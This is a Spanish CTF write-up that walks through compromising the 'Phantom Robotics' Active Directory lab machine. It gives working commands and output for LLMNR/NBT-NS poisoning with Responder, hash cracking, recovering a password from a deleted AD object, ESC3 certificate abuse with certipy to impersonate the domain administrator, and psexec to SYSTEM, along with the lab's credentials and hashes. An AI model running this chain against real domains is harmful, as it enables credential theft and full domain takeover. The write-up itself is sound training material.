---
creator: nohh022
pubDatetime: 2026-05-15T01:00:00Z
title: Phantom Robotics
slug: phantom-robotics
platform: The Hackers Labs
ogImage: ../../assets/images/thehackerslabs/phantom-robotics/phantom-robotics.jpg
featured: false
tags:
  - windows
  - active directory
  - llmnr/nbt-ns poisoning
  - esc3
  - tombstone
description:
  Write up de la máquina Phantom Robotics de la plataforma The Hackers Labs
---

![logo](../../assets/images/thehackerslabs/phantom-robotics/phantom-robotics.jpg)

## Table of contents

## Enumeración

La máquina Phantom Robotics tiene la ip **192.168.56.100** 

Disponemos de las credenciales **mark:suP3rPa$sw0rd2026!&**

### Descubrimiento de Puertos

Vamos a empezar enumerando todos los puertos abiertos de la máquina, así como los servicios y las versiones que se están ejecutando en ellos mediante la herramienta **nmap**.

```bash
nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn 192.168.56.100

Nmap scan report for 192.168.56.100
Host is up (0.00043s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 07:43:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-15T07:45:26+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
|_ssl-date: 2026-05-15T07:45:26+00:00; +2s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-15T07:45:26+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-15T07:45:26+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
57865/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57866/tcp open  msrpc         Microsoft Windows RPC
57876/tcp open  msrpc         Microsoft Windows RPC
57885/tcp open  msrpc         Microsoft Windows RPC
57895/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:7B:2B:07 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: Antes de ello, vamos a a
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-15T07:44:46
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:7b:2b:07 (Oracle VirtualBox virtual NIC)
```

Añadimos los dominios **PHANTOM.THL** y **DC01.PHANTOM.THL** con la ip al **/etc/hosts**

```bash
echo '192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL' | tee -a /etc/hosts
```

### Puerto 139 y 445 (SMB)

Vamos a utilizar **NetExec** para enumerar el contenido del **smb** con las credenciales del usuario **mark**.

```bash
nxc smb 192.168.56.100 -u mark -p  'suP3rPa$sw0rd2026!&' --shares

SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!& 
SMB         192.168.56.100  445    DC01             [*] Enumerated shares
SMB         192.168.56.100  445    DC01             Share           Permissions     Remark
SMB         192.168.56.100  445    DC01             -----           -----------     ------
SMB         192.168.56.100  445    DC01             ADMIN$                          Admin remota
SMB         192.168.56.100  445    DC01             C$                              Recurso predeterminado
SMB         192.168.56.100  445    DC01             Dev Tools       READ,WRITE      Dev Tools
SMB         192.168.56.100  445    DC01             IPC$            READ            IPC remota
SMB         192.168.56.100  445    DC01             NETLOGON        READ            Recurso compartido del servidor de inicio de sesi¢n 
SMB         192.168.56.100  445    DC01             SYSVOL          READ            Recurso compartido del servidor de inicio de sesi¢n
```

Vemos que nuestro usuario tiene permisos de lectura y escritura en el directorio **Dev Tools**, por lo que nos conectamos al **smb** para ver el contenido del directorio.

```bash
 smbclient '//192.168.56.100/Dev Tools' -U mark                                  
Password for [WORKGROUP\mark]:

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri May 15 03:52:55 2026
  ..                                  D        0  Sat Feb 21 12:29:29 2026

                12935167 blocks of size 4096. 9860825 blocks available

```

Está vacío.

### Puerto 135 (RPC)

Vamos a conectarnos como el usuario **mark** al **Remote Procedure Call** (**RPC**), este protocolo permite a un programa de un sistema ejecutar un procedimiento o código en otro sistema remoto.

Una vez conectados listaremos los usuarios del dominio.

```bash
rpcclient 192.168.56.100 -U mark
Password for [WORKGROUP\mark]:

rpcclient $> enumdomusers

user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[mark] rid:[0x44f]
user:[bob] rid:[0x450]
user:[joe] rid:[0x451]
user:[mia] rid:[0x452]
user:[sandra] rid:[0x453]
user:[maria] rid:[0x454]
user:[ana] rid:[0x455]
user:[michael] rid:[0x456]
user:[ian] rid:[0x457]
user:[joshua] rid:[0x458]
user:[frank] rid:[0x459]
user:[tomas] rid:[0x45b]
user:[robert] rid:[0x45c]
user:[LegacyAdmins] rid:[0x464]
```
Ya tenemos a los usuarios del dominio, podemos ejecutar un ataque de fuerza bruta con esos usuarios pero no nos va a servir. Los usuarios nos harán falta más adelante.

## Explotación
### LLMNR/NBT-NS Poisoning

**Link-Local Multicast Name Resolution** (**LLMNR**) y **NetBIOS Name Service** (**NBT-NS**) son protocoles de Windows de resolución de nombres usados cuando el **DNS** falla o no existe. 

Dichos protocolos habilitados suponen un riesgo de seguridad, ya que, si un usuario intenta acceder a un recurso inexistente del dominio, un atacante podría aprovechar estos protocolos para responder a la solicitud de resolución de nombres, suplantando dicho recurso y provocando que la víctima envíe su **NTLM hash** al atacante.

Por lo tanto, vamos a emplear **responder** en la interfaz de red en la que se encuentra la máquina para envenenar las solicitudes de ambos protocolos. Sólo nos queda esperar a que algún usuario acceda a un recurso erróneo y así nosotros suplantaremos dicho recurso para obtener el **NTLM hash** del usuario.

```bash
sudo responder -I eth1

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                                                                 
[SMB] NTLMv2-SSP Client   : fe80::f0af:d5ce:c78d:246e
[SMB] NTLMv2-SSP Username : PHANTOM.LOCAL\robert
[SMB] NTLMv2-SSP Hash     : robert::PHANTOM.LOCAL:c0e120381dc543cf:F410978497B9546C6E99C88E5FECCB79:0101000000000000802EC71822E4DC016E80BF771387372A000000000200080052004A004100520001001E00570049004E002D003500420044003200580033005A004A0048004300590004003400570049004E002D003500420044003200580033005A004A004800430059002E0052004A00410052002E004C004F00430041004C000300140052004A00410052002E004C004F00430041004C000500140052004A00410052002E004C004F00430041004C0007000800802EC71822E4DC01060004000200000008003000300000000000000000000000003000009DB17DE7E5268F635DA7E410B883C9D401F288AF60293005F4FAB03FD5ADCD620A001000000000000000000000000000000000000900240063006900660073002F005000480041004E0054004F004D002E004C004F00430041004C000000000000000000
```

Obtenemos el **NTLM hash** del usuario **robert** y empleamos **John The Ripper** y el diccionario **rockyou** para romperlo.

**Nota**: Guardar el hash completo, es decir, desde **robert::PHANTOM.LOCAL** hasta el final.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bLink182         (robert)     
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

## Acceso Winrm
### Robert

Ya tenemos las credenciales **robert:bLink182**, vamos a probar si podemos conectarnos al **winrm** (puerto 5985) con ellas.

```bash
nxc winrm 192.168.56.100 -u robert -p bLink182

WINRM       192.168.56.100  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:PHANTOM.THL) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.100  5985   DC01             [+] PHANTOM.THL\robert:bLink182 (Pwn3d!)
```

**NetExec** nos indica que las credenciales son válidas, así que, vamos a conectarnos al **winrm** usando **evil-winrm**.

```bash
evil-winrm -i 192.168.56.100 -u robert -p bLink182                                        

*Evil-WinRM* PS C:\Users\robert\Documents> whoami
phantom\robert
*Evil-WinRM* PS C:\Users\robert\Documents> dir ../Desktop
    Directorio: C:\Users\robert\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/22/2026   3:01 AM             33 user.txt
```

## Movimiento Lateral
### Tomas

Dentro del directorio **Documents** de **robert** vemos un archivo **migration_notes.txt**

```text
[OK] Verify application connectivity after the ERP migration

Validate that legacy authentication is still working for internal tools

Review Active Directory group memberships (DevOps / Support)

[OK] Confirm that backup jobs are running correctly

Check access permissions on shared resources

[IMPORTANT] Remember to clean up temporary test accounts created during the migration

Remove unused scripts and obsolete configurations

[OK] Verify expiration and renewal of internal certificates

Document performed steps and lessons learned from the migration
```

El archivo es un listado de operaciones que se han realizado durante una migración del sistema, se indica como **importante** la eliminación de cuentas temporales creadas durante la migración.

Aquí entra en juego el concepto **tombstone** que es el estado en el que queda un objeto después de haber sido eliminado en un **AD** antes de desaparecer por completo, es decir, al borrar un objeto en **AD** no se borra directamente, sino que se genera un **tombstone** que permanecerá activo durante un tiempo determinada.

Por lo tanto, vamos a acceder al contenido de este **tombstone**, como estos objetos poseen un atributo **isDeleted=TRUE** vamos a listar los objetos con ese atributo. 

```powershell
*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Property * | Format-List Name,ObjectGUID,Deleted,DistinguishedName

Name              : Deleted Objects
ObjectGUID        : 63e0d32e-2125-40ad-8405-c87b353e09b9
Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=PHANTOM,DC=THL

Name              : dev_test
                    DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
Deleted           : True
DistinguishedName : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
```

Vemos un objeto con el nombre **dev_test** que nos encaja como un nombre de una cuenta temporal. Ahora sacamos las propiedades de ese objeto.

```powershell

*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -IncludeDeletedObjects -Filter * -Properties * | Where-Object {$_.Name -like "*dev_test*"} | Format-List *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : PHANTOM.THL/Deleted Objects/dev_test
                                  DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
CN                              : dev_test
                                  DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
codePage                        : 0
countryCode                     : 0
Created                         : 2/21/2026 6:09:48 PM
createTimeStamp                 : 2/21/2026 6:09:48 PM
Deleted                         : True
Description                     : f6Y%UPa6ZB9eR5wG9$an
DisplayName                     : dev_test
DistinguishedName               : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
dSCorePropagationData           : {2/21/2026 8:23:32 PM, 1/1/1601 1:00:04 AM}
givenName                       : dev_test
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Users,DC=PHANTOM,DC=THL
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 2/21/2026 7:16:40 PM
modifyTimeStamp                 : 2/21/2026 7:16:40 PM
msDS-LastKnownRDN               : dev_test
Name                            : dev_test
                                  DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
objectSid                       : S-1-5-21-3580157585-956322742-780763674-1114
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 134161673885023278
sAMAccountName                  : dev_test
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : dev_test@PHANTOM.THL
uSNChanged                      : 12981
uSNCreated                      : 12845
whenChanged                     : 2/21/2026 7:16:40 PM
whenCreated                     : 2/21/2026 6:09:48 PM
PropertyNames                   : {accountExpires, badPasswordTime, badPwdCount, CanonicalName...}
AddedProperties                 : {}
RemovedProperties               : {}
ModifiedProperties              : {}
PropertyCount                   : 41
```

En el campo **description** vemos un string que podrían ser una contraseña, así que, vamos a usar los usuarios que sacamos anteriormente para comprobar si pertenece a alguno de ellos.

```bash
nxc winrm 192.168.56.100 -u users.txt -p 'f6Y%UPa6ZB9eR5wG9$an'

WINRM       192.168.56.100  5985   DC01             [+] PHANTOM.THL\tomas:f6Y%UPa6ZB9eR5wG9$an (Pwn3d!)
```

Ya nos podemos conectar como **tomas**.

### Administrador

Vamos a enumerar el **AD** utilizando **ADPulse**. 

- https://github.com/dievus/ADPulse

Lo instalamos siguiendo las instrucciones y lo usamos sobre el **AD** con las credenciales del usuario **tomas**.

```bash
python3 ADPulse.py --domain PHANTOM.THL --user tomas --password 'f6Y%UPa6ZB9eR5wG9$an' --dc-ip 192.168.56.100
...
[HIGH] [ADCS]  ESC3 - Enrollment Agent Templates
    5 enrollment agent template(s) without approval.
      * EnrollmentAgent
      * EnrollmentAgentOffline
      * MachineEnrollmentAgent
      * CEPEncryption
      * Phantom-DevAuth (enrollees: tomas (user))
    >> Enable manager approval on enrollment agent templates.
....
```

Nos indica muchas vulnerabilidades pero vamos a explotar la **ESC3** (**Enrollment Agent Templates**), la cual permite a un atacante sin privilegios escalar a Administrador del Dominio.

Para realizar este ataque vamos a seguir un post del creador de esta máquina **d4redevil**, que explica como explotar esta vulnerabilidad.

- **https://zonahacking.com/post/esc3**

Primero enumeramos los certificados vulnerables de los **Servicios de Certificados de Active Directory** (**AD CS**).

```bash
certipy-ad find -u 'tomas@phantom.thl' -p 'f6Y%UPa6ZB9eR5wG9$an' -dc-ip 192.168.56.100 -vulnerable -stdout

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'PHANTOM-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'PHANTOM-DC01-CA'
[*] Checking web enrollment for CA 'PHANTOM-DC01-CA' @ 'DC01.PHANTOM.THL'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : PHANTOM-DC01-CA
    DNS Name                            : DC01.PHANTOM.THL
    Certificate Subject                 : CN=PHANTOM-DC01-CA, DC=PHANTOM, DC=THL
    Certificate Serial Number           : 161A58313EFA72A045F730EFC3CFED39
    Certificate Validity Start          : 2026-02-21 23:23:37+00:00
    Certificate Validity End            : 2031-02-21 23:33:37+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : PHANTOM.THL\Administrators
      Access Rights
        ManageCa                        : PHANTOM.THL\Administrators
                                          PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas
        ManageCertificates              : PHANTOM.THL\Administrators
                                          PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas
        Enroll                          : PHANTOM.THL\Authenticated Users
Certificate Templates
  0
    Template Name                       : Phantom-DevAuth
    Display Name                        : Phantom-DevAuth
    Certificate Authorities             : PHANTOM-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-02-21T23:36:09+00:00
    Template Last Modified              : 2026-02-21T23:37:14+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PHANTOM.THL\Tomas
                                          PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas
      Object Control Permissions
        Owner                           : PHANTOM.THL\Administrador
        Full Control Principals         : PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas
        Write Owner Principals          : PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas
        Write Dacl Principals           : PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas
        Write Property Enroll           : PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas
    [+] User Enrollable Principals      : PHANTOM.THL\Tomas
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

La enumeración nos confirma que es vulnerable a **ESC3**, además, vamos a necesitar tanto el **CA Name** como el **Template Name**.

Ahora vamos a solicitar un certificado para **tomas**.

```bash
certipy-ad req -u 'tomas@PHANTOM.THL' -p 'f6Y%UPa6ZB9eR5wG9$an' -dc-ip 192.168.56.100 -ca PHANTOM-DC01-CA -template Phantom-DevAuth

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate with UPN 'tomas@PHANTOM.THL'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'tomas.pfx'
[*] Wrote certificate and private key to 'tomas.pfx'
```

Ya tenemos el certificado de **tomas**. Ahora, vamos a aprovecharnos de la confianza de la **Certification Authority** (**CA**) en este certificado para solicitar y emitir un nuevo certificado a nombre del **administrador**.

```bash
certipy-ad req -u 'tomas@PHANTOM.THL' -p 'f6Y%UPa6ZB9eR5wG9$an' -dc-ip 192.168.56.100 -ca PHANTOM-DC01-CA -template 'User' -on-behalf-of 'administrador' -pfx tomas.pfx

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrador@PHANTOM.THL'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrador.pfx'
[*] Wrote certificate and private key to 'administrador.pfx'
```

Obtenemos el certificado a nombre del **administrador** y nos autenticamos con él.

```bash
certipy-ad auth -pfx administrador.pfx -username administrador -domain PHANTOM.THL -dc-ip 192.168.56.100

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrador@PHANTOM.THL'
[*] Using principal: 'administrador@phantom.thl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrador.ccache'
[*] Wrote credential cache to 'administrador.ccache'
[*] Trying to retrieve NT hash for 'administrador'
[*] Got hash for 'administrador@phantom.thl': aad3b435b51404eeaad3b435b51404ee:dda94fc1fe08ac45c2cc490404651162
```

Esto nos genera **Ticket Granting Ticket** (**TGT**), es un pase temporal expedido por Kerberos que nos permite conectarnos a un dominio sin proporcionar contraseña. Empleamos el **TGT** para conectarnos al **Domain Controller** como el usuario **administrador**.

```bash
KRB5CCNAME=administrador.ccache impacket-psexec -k -no-pass DC01.PHANTOM.THL                            

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.PHANTOM.THL.....
[*] Found writable share ADMIN$
[*] Uploading file iPMCpQpd.exe
[*] Opening SVCManager on DC01.PHANTOM.THL.....
[*] Creating service RrdA on DC01.PHANTOM.THL.....
[*] Starting service RrdA.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Version 10.0.20348.587]

(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> dir C:\Users\Administrador\Desktop

 Directorio de C:\Users\Administrador\Desktop

22/02/2026  04:01    <DIR>          .
29/03/2026  00:04    <DIR>          ..
22/02/2026  04:01                33 root.txt
```